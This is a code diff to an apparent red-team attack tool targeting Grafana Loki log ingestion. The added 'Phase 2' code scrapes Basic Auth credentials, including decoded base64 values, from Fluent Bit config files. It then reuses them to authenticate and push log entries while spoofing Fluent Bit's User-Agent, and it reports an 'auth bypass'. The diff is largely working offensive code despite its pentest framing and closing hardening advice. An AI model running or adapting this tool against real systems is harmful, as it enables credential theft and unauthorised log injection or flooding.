@@ -55,6 +55,8 @@ class LokiTarget:
     path: str
     labels: Dict[str, str]
     tenant_id: Optional[str] = None
+    http_user: Optional[str] = None
+    http_passwd: Optional[str] = None
 
 @dataclass
 class AttackConfig:
@@ -137,6 +139,22 @@ class FluentBitConfigParser:
             path = self._extract_value(block, 'Uri') or '/loki/api/v1/push'
             tenant_id = self._extract_value(block, 'Tenant_ID')
             
+            # Extract authentication credentials (Phase 2: Auth Bypass)
+            http_user = self._extract_value(block, 'http_user') or self._extract_value(block, 'HTTP_User')
+            http_passwd = self._extract_value(block, 'http_passwd') or self._extract_value(block, 'HTTP_Passwd')
+            
+            # Also check for Basic_Auth format (base64 encoded user:pass)
+            basic_auth = self._extract_value(block, 'Basic_Auth')
+            if basic_auth and not (http_user and http_passwd):
+                try:
+                    import base64
+                    decoded = base64.b64decode(basic_auth).decode('utf-8')
+                    if ':' in decoded:
+                        http_user, http_passwd = decoded.split(':', 1)
+                        logging.info(f"    [+] Decoded Basic_Auth credentials")
+                except Exception:
+                    pass
+            
             # Extract labels
             labels = {}
             label_matches = re.findall(r'Labels\s+(.+)', block, re.IGNORECASE)
@@ -158,11 +176,15 @@ class FluentBitConfigParser:
                 port=port,
                 path=path,
                 labels=labels,
-                tenant_id=tenant_id
+                tenant_id=tenant_id,
+                http_user=http_user,
+                http_passwd=http_passwd
             ))
             
             logging.info(f"    [+] Found Loki output: {host}:{port}{path}")
             logging.info(f"        Labels: {labels}")
+            if http_user:
+                logging.info(f"        [!] CREDENTIALS SCRAPED: user={http_user}, passwd={'*' * len(http_passwd) if http_passwd else 'N/A'}")
     
     def _extract_value(self, block: str, key: str) -> Optional[str]:
         """Extract a configuration value from a block."""
@@ -179,6 +201,8 @@ class LokiAttackClient:
     """
     HTTP client that mimics Fluent Bit's Loki output plugin.
     Headers and payload format match legitimate traffic exactly.
+    
+    Phase 2 Enhancement: Supports Basic Authentication via scraped credentials.
     """
     
     # Fluent Bit's actual User-Agent format
@@ -190,6 +214,7 @@ class LokiAttackClient:
         self.base_url = f"http://{target.host}:{target.port}"
         self.push_url = f"{self.base_url}{target.path}"
         self.session = requests.Session()
+        self.auth_enabled = False
         
         # Set headers to exactly match Fluent Bit
         self.session.headers.update({
@@ -200,15 +225,44 @@ class LokiAttackClient:
         # Add tenant header if configured
         if target.tenant_id:
             self.session.headers['X-Scope-OrgID'] = target.tenant_id
+        
+        # Phase 2: Configure Basic Auth if credentials were scraped
+        if target.http_user and target.http_passwd:
+            self.session.auth = (target.http_user, target.http_passwd)
+            self.auth_enabled = True
+            logging.info(f"    [+] Basic Auth configured: user={target.http_user}")
     
     def verify_connectivity(self) -> Tuple[bool, str]:
         """
         Verify we can reach the Loki API.
-        Uses the /ready endpoint first, then attempts a minimal push.
+        Phase 2: First tests without auth, then with scraped credentials.
         """
         logging.info(f"[*] Verifying connectivity to {self.base_url}")
         
-        # Check /ready endpoint
+        # Phase 2: First attempt WITHOUT authentication to verify protection
+        if self.auth_enabled:
+            logging.info("    [*] Phase 2: Testing unauthenticated access first...")
+            try:
+                no_auth_session = requests.Session()
+                no_auth_session.headers.update({
+                    'User-Agent': self.FLUENT_BIT_USER_AGENT,
+                    'Content-Type': 'application/json',
+                })
+                resp = no_auth_session.get(
+                    f"{self.base_url}/ready",
+                    timeout=self.timeout
+                )
+                if resp.status_code == 401:
+                    logging.info("    [+] CONFIRMED: Endpoint requires authentication (HTTP 401)")
+                    logging.info("        Blue Team patch is in place!")
+                elif resp.status_code == 403:
+                    logging.info("    [+] CONFIRMED: Endpoint forbidden without auth (HTTP 403)")
+                else:
+                    logging.warning(f"    [?] Unexpected response without auth: {resp.status_code}")
+            except requests.RequestException as e:
+                logging.debug(f"    [*] No-auth test failed: {e}")
+        
+        # Check /ready endpoint (with auth if available)
         try:
             resp = self.session.get(
                 f"{self.base_url}/ready",
@@ -216,6 +270,12 @@ class LokiAttackClient:
             )
             if resp.status_code == 200:
                 logging.info("    [+] Loki /ready endpoint: OK")
+                if self.auth_enabled:
+                    logging.info("    [!] AUTH BYPASS SUCCESSFUL: Scraped credentials valid!")
+            elif resp.status_code == 401:
+                return False, "Authentication required - credentials not accepted or not provided"
+            elif resp.status_code == 403:
+                return False, "Access forbidden - insufficient permissions"
             else:
                 logging.warning(f"    [!] Loki /ready returned: {resp.status_code}")
         except requests.RequestException as e:
@@ -227,7 +287,7 @@ class LokiAttackClient:
                 labels={"job": "connectivity_test", "source": "pentest"},
                 entries=[{
                     "ts": self._get_timestamp_ns(),
-                    "line": "Connectivity verification - Red Team Assessment"
+                    "line": "Connectivity verification - Red Team Assessment Phase 2"
                 }]
             )
             
@@ -239,8 +299,15 @@ class LokiAttackClient:
             
             if resp.status_code in (200, 204):
                 logging.info("    [+] Push API accessible: CONFIRMED")
-                logging.info("    [!] VULNERABILITY: No authentication required!")
-                return True, "Unauthenticated access confirmed"
+                if self.auth_enabled:
+                    logging.info("    [!] VULNERABILITY: Auth bypass via credential scraping!")
+                else:
+                    logging.info("    [!] VULNERABILITY: No authentication required!")
+                return True, "Access confirmed" + (" (via scraped credentials)" if self.auth_enabled else " (unauthenticated)")
+            elif resp.status_code == 401:
+                return False, f"Push rejected: Authentication required (HTTP 401)"
+            elif resp.status_code == 403:
+                return False, f"Push rejected: Forbidden (HTTP 403)"
             else:
                 return False, f"Push rejected with status {resp.status_code}: {resp.text}"
                 
@@ -627,7 +694,7 @@ EXAMPLES:
     target_group = parser.add_argument_group('Target Specification')
     target_group.add_argument(
         '-c', '--config',
-        help='Path to fluent-bit.conf to auto-extract Loki target'
+        help='Path to fluent-bit.conf to auto-extract Loki target and credentials'
     )
     target_group.add_argument(
         '--host',
@@ -638,6 +705,22 @@ EXAMPLES:
         type=int,
         default=3100,
         help='Loki port (default: 3100)'
+    )
+    
+    # Authentication (Phase 2)
+    auth_group = parser.add_argument_group('Authentication (Phase 2)')
+    auth_group.add_argument(
+        '--user',
+        help='HTTP Basic Auth username (scraped from config or manual)'
+    )
+    auth_group.add_argument(
+        '--passwd',
+        help='HTTP Basic Auth password (scraped from config or manual)'
+    )
+    auth_group.add_argument(
+        '--no-auth',
+        action='store_true',
+        help='Force unauthenticated mode (test if auth is enforced)'
     )
     
     # Attack configuration
@@ -709,7 +792,7 @@ EXAMPLES:
     target = None
     
     if args.config:
-        # Parse Fluent Bit config to extract target
+        # Parse Fluent Bit config to extract target AND credentials
         try:
             parser_fb = FluentBitConfigParser(args.config)
             targets = parser_fb.parse()
@@ -717,6 +800,14 @@ EXAMPLES:
             if targets:
                 target = targets[0]  # Use first Loki output found
                 logging.info(f"[+] Using target from config: {target.host}:{target.port}")
+                
+                # Phase 2: Report credential scraping success
+                if target.http_user and target.http_passwd:
+                    logging.info(f"[+] PHASE 2: Credentials scraped from config!")
+                    logging.info(f"    User: {target.http_user}")
+                    logging.info(f"    Pass: {'*' * len(target.http_passwd)}")
+                else:
+                    logging.warning("[!] No credentials found in config - will attempt unauthenticated")
             else:
                 logging.error("[!] No Loki outputs found in config")
                 sys.exit(1)
@@ -730,10 +821,20 @@ EXAMPLES:
             host=args.host,
             port=args.port,
             path='/loki/api/v1/push',
-            labels={'job': 'pentest'}
+            labels={'job': 'pentest'},
+            http_user=args.user,
+            http_passwd=args.passwd
         )
+        if args.user and args.passwd:
+            logging.info(f"[+] Using manual auth: user={args.user}")
     else:
         parser.error("Either --config or --host must be specified")
+    
+    # Phase 2: Override auth if --no-auth specified
+    if args.no_auth:
+        logging.info("[*] --no-auth specified: Forcing unauthenticated mode")
+        target.http_user = None
+        target.http_passwd = None
     
     # Safety check for destructive modes
     if args.mode != 'safe':
@@ -766,7 +867,15 @@ EXAMPLES:
     # Exit code based on success
     if stats['requests_success'] > 0:
         logging.info("\n[+] Attack completed successfully")
-        logging.info("[*] Recommendation: Implement auth_enabled: true in Loki config")
+        if executor.client.auth_enabled:
+            logging.info("[!] PHASE 2 COMPLETE: Authentication bypassed via credential scraping")
+            logging.info("[*] Recommendations:")
+            logging.info("    1. Implement per-tenant rate limiting (ingestion_rate_mb)")
+            logging.info("    2. Set max_streams_per_user / max_global_streams_per_user")
+            logging.info("    3. Use secrets management - not plaintext in configs")
+            logging.info("    4. Rotate credentials after compromise detection")
+        else:
+            logging.info("[*] Recommendation: Implement auth_enabled: true in Loki config")
         sys.exit(0)
     else:
         logging.error("\n[!] Attack failed - no successful requests")
